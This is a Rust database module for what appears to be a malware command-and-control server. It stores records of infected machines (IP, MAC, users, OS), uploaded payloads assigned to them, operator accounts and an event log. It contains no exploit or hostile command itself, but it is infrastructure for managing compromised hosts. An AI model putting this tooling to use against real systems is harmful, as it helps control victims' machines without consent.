use rusqlite::Connection;
use rusqlite::params;
use crate::payload_db::Payload;
use crate::machine_db::InfectedMachine;
use crate::events::Events;

extern crate chrono;
use chrono::prelude::*;

pub struct Database {
    conn: Connection,
}

impl Database {
    pub fn new(db_path: &str) -> rusqlite::Result<Self> {
        let conn = Connection::open(db_path)?;
        Ok(Database { conn })
    }

    pub fn initialize(&self) -> rusqlite::Result<()> {
        self.create_infected_machine_table()?;
        self.create_payloads_table()?;
        self.create_users_table()?;
        self.create_event_table()?;
        Ok(())
    }

    pub fn fetch_all_payloads(&self) -> rusqlite::Result<Vec<Payload>> {
        Payload::fetch_all(&self.conn)
    }

    pub fn count_payload(&self) -> rusqlite::Result<String> {
        Payload::count_all(&self.conn)
    }

    pub fn fetch_payload_by_id(&self, id: u64) -> rusqlite::Result<Payload> {
        Payload::fetch_payload_by_id(&self.conn, id)
    }
    pub fn delete_payload_by_id(&self, id: u64) -> Result<(), rusqlite::Error> {
        let _ = Payload::delete_payload_by_id(&self.conn, id);
        let _ = Events::new
        (
            21,
            None,
            None,
            Some(id.to_string()),
            None,
        ).log_to_file();

        Ok(())
    }

    pub fn fetch_all_machine(&self) -> rusqlite::Result<Vec<InfectedMachine>> {
        InfectedMachine::fetch_all(&self.conn)
    }

    pub fn count_machine(&self) -> rusqlite::Result<String> {
        InfectedMachine::count_all(&self.conn)
    }

    pub fn fetch_machine_by_id(&self, id: u64) -> rusqlite::Result<InfectedMachine> {
        InfectedMachine::fetch_machine_by_id(&self.conn, id)
    }

    pub fn count_by_os(&self) -> rusqlite::Result<Vec<(String, u64)>>{
        InfectedMachine::count_by_os(&self.conn)
    }

    pub fn add_new_payload(&self, name: &str, content: &str, p_type: &str) -> rusqlite::Result<()> {
	// execute the query to add the new uploaded payload to the database
        self.conn.execute(
            "INSERT INTO payloads (payload_name, payload_data, payload_type) VALUES (?1, ?2, ?3)",
            &[name, content, p_type],
        )?;
	
	// Create an event to log the new payload uploaded
        let _ = Events::new
        (
            8,
            None,
            None,
            Some(name.to_string()),
            None,
        ).log_to_file();
        Ok(())
    }

    pub fn add_new_machine(&self, machine_name: &str, ip: &str, mac: &str, users: &str, os: &str, os_version: &str) -> rusqlite::Result<()> 
    {
    
    
        // get today date for last/first_active
        let now = Utc::now();
        let last_active = now.format("%d-%m-%Y %H:%M").to_string();
        let first_active = now.format("%d-%m-%Y %H:%M").to_string();
    
        // prepare the query to add a new machine in the infected_machine table
        let sql = "INSERT INTO infected_machine (machine_name, ip, mac, users, os, os_version, first_active, last_active, payload_id) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9)";
        
        // execute the query and create an event if the query succeded
        match self.conn.execute(sql, &[machine_name, ip, mac, users, os, os_version, &first_active, &last_active, "0"]) {
            Ok(_) => {
                let _ = Events::new
                (
                 1,
                 Some(ip.to_string()),
                 Some(machine_name.to_string()),
                 None,
                 None,
                ).log_to_file();
                Ok(())
            },
            Err(err) => {
                eprintln!("Error inserting data into the database: {:?}", err);
                return Err(err);
            }
        }
    
    }

    pub fn add_new_event(&self, event_id : i32, description: &str) -> Result<(), rusqlite::Error>
    {
        let now = Utc::now();
        let time = now.format("%d-%m-%Y %H:%M").to_string();

        let sql = "INSERT INTO events (event_id, description, time) VALUES (?1, ?2, ?3)";

        match self.conn.execute(sql, params![event_id, description, &time]) 
        {
            Ok(_) => {
                return Ok(());
            },
            Err(err) => {
                eprintln!("Error inserting data into the database: {:?}", err);
                return Err(err);
            }
        }

    }

    pub fn fetch_all_events(&self) -> rusqlite::Result<Vec<Events>> {
        Events::fetch_all(&self.conn)
    }

    pub fn count_events(&self) -> rusqlite::Result<String> {
        Events::count_all(&self.conn)
    }


    fn create_infected_machine_table(&self) -> rusqlite::Result<()> {
        self.conn.execute(
            "CREATE TABLE IF NOT EXISTS infected_machine (
                id INTEGER PRIMARY KEY,
                machine_name TEXT NOT NULL,
                ip TEXT NOT NULL,
                mac TEXT UNIQUE NOT NULL,
                users TEXT,
                os TEXT NOT NULL,
                os_version TEXT NOT NULL,
                first_active TEXT NOT NULL,
                last_active TEXT NOT NULL,
                payload_id INTEGER
            )",
            (),
        )?;
        Ok(())
    }

    fn create_payloads_table(&self) -> rusqlite::Result<()> {
        self.conn.execute(
            "CREATE TABLE IF NOT EXISTS payloads (
                payload_id INTEGER PRIMARY KEY,
                payload_name TEXT UNIQUE NOT NULL,
                payload_type TEXT NOT NULL,
                payload_data BLOB
            )",
            (),
        )?;
        Ok(())
    }
    
    fn create_users_table(&self) -> rusqlite::Result<()> {
        self.conn.execute(
            "CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                username TEXT UNIQUE NOT NULL,
                hashed_password TEXT NOT NULL,
                role TEXT NOT NULL,
                date_created TEXT NOT NULL,
                last_connection TEXT NOT NULL
            )",
            (),
        )?;
        Ok(())
    }

    fn create_event_table(&self) -> rusqlite::Result<()> {
        self.conn.execute(
            "CREATE TABLE IF NOT EXISTS events (
                id INTEGER PRIMARY KEY,
                event_id INTEGER NOT NULL,
                description TEXT NOT NULL,
                time TEXT NOT NULL
            )",
            (),
        )?;
        Ok(())
    }
}

